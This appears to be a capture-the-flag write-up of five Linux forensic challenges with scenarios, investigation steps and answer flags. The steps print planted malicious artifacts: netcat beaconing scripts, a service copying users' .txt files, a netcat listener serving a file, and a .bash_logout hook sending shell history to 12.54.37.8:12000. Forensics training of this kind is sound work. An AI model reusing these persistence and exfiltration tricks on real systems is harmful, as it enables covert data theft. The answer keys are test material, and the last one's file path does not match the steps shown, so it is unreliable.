# Linux Process Find Evil

# 1. (15)
Prompt:
```
Scenario: The Villains group has been chanting offerings to their new leader at regular intervals over a TCP connection.

Task: Identify their method of communication and how it is occurring. Locate the following artifacts: ** The chant/text used by each villain (include spaces) ** The new Lord receiving the offering ** The IP address and port that the offering is received over

Flag format: chant text,new Lord,IP:port

Machine: Minas_Tirith
```

Steps:
```
bombadil@minas-tirith:/proc$ sudo lsof -i TCP -a
COMMAND  PID       USER   FD   TYPE   DEVICE SIZE/OFF NODE NAME
nc      8903 witch_king    3u  IPv4 15912862      0t0  TCP *:1234 (LISTEN)

bombadil@minas-tirith:/proc$ cat /etc/group
villians:x:1003:Balrog,Saruman,Dunlendings,Gollum,Haradrim,Uruks,Orcs,Blog,Azog,Wights,Gothmog,Goblin
_King,Shelob,Lurtz,King_Of_The_Dead,Smaug,The_Eye,witch_king

bombadil@minas-tirith:/proc$ strings /home/witch_king/camlindon
#!/bin/bash
 flock -n 9 || exit 1
 echo "beaconing"
 for i in $(seq 1 5); do nc -lw10 127.0.0.1 -p 1234 2>/dev/null  ; sleep 10; done
 echo "done beaconing"
) 9>/tmp/mylockfile

from htop:
/home/Blog/offering

bombadil@minas-tirith:/home/Blog$ ls
chant  chantlock  offering

bombadil@minas-tirith:/home/Blog$ cat chant
Mausan ukoul for avhe mubullat goth

bombadil@minas-tirith:/home/Blog$ cat offering
#!/bin/bash
(
    flock -n 9 || exit 1
    echo "chanting"
    for i in $(seq 1  3); do netcat -w5 127.0.0.1 1234 < /home/Blog/chant ; sleep 1; done
)   9>/home/Blog/chantlock

```

Answer:
```
Mausan ukoul for avhe mubullat goth,witch_king,127.0.0.1:1234
```

# 2. (15)
Prompt:
```
Scenario: Someone or something is stealing files with a .txt extension from user directories. Determine how these thefts are occurring.

Task: Identify the command being ran and how it occurs.

Flag format: command,how it occurs

Machine: Terra
```

Steps:
```
sudo cat /var/log/syslog | grep ".txt"
Mar  7 06:33:20 terra systemd[1]: /lib/systemd/system/vestrisecreta.service:6: Ignoring unknown escap
e sequences: "find /home -name \*.txt -exec cp {} /tmp \;"

```

Answer:
```
find /home -name \*.txt -exec cp {} /tmp \;,vestrisecreta.service
```

# 3. (15)
Prompt:
```
Scenario: Text files are being exfiltrated from the machine using a network connection. The connections still occur post-reboot, according to network analysts.

The junior analysts are having a hard time with attribution because no strange programs or ports are running, and the connection seems to only occur in 60-second intervals, every 15 minutes.

Task: Determine the means of persistence used by the program, and the port used. The flag is the command that allows exfiltration, and the file its persistence mechanism uses.

Flag format: command,persistence

Machine: Terra
```

Steps:
```
garviel@terra:~$ cat /lib/systemd/system/whatischaos.service
[Unit]
Description=Run a service

[Service]
Type=exec
ExecStart=/bin/bash -c 'netcat -lp 3389 < /tmp/NMAP_all_hosts.txt'
Restart=no
RuntimeMaxSec=60s

```

Answer:
```
netcat -lp 3389 < /tmp/NMAP_all_hosts.txt,whatischaos.timer
```

# 4. (15)
Prompt:
```
Scenario: The web server has been modified by an unknown hacktivist group. Users accessing the web server are reporting crashes and insane disk usage.

Task: Identify the Cyber Attack Method used by the group, and the command running.

Flag format: method,command

Machine: Terra
```

Steps:
```
garviel@terra:/lib/systemd/system$ cat apache3.service
[Unit]
Description=Creates a web server

[Service]
Type=simple
ExecStart=/bin/bash -c '/bin/apache3 -lp 443 < /dev/urandom'
```

Answer:
```
ddos,/bin/apache3 -lp 443 < /dev/urandom
```

# 5. (15)
Prompt:
```
Scenario: Analysts have found a dump of commands on the Internet that refer to the Terra machine. The command history for one of the users with an interactive login is being stolen via unknown means. The network analysts can’t find any persistent connections, but notice a spike in traffic on logon and logoff.

Task: Identify how the command history is stolen from the machine.

The flag is the file used to execute the commands, and where they are sent.

Flag format: /absolute/path/to/file,IP:port

Machine: Terra
```

Steps:
```
garviel@terra:~$ cat .bash_logout
# ~/.bash_logout: executed by bash(1) when login shell exits.

# when leaving the console clear the screen to increase privacy

if [ "$SHLVL" = 1 ]; then
    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
fi
history -w /tmp/systemd-private.$HEAD-systemd-resolved.service-$HEAD2
nc -w2 12.54.37.8 12000 < /tmp/systemd-private.$HEAD-systemd-resolved.service-$HEAD2
```

Answer:
```
/etc/garviel/.bash_logout,12.54.37.8:12000
```
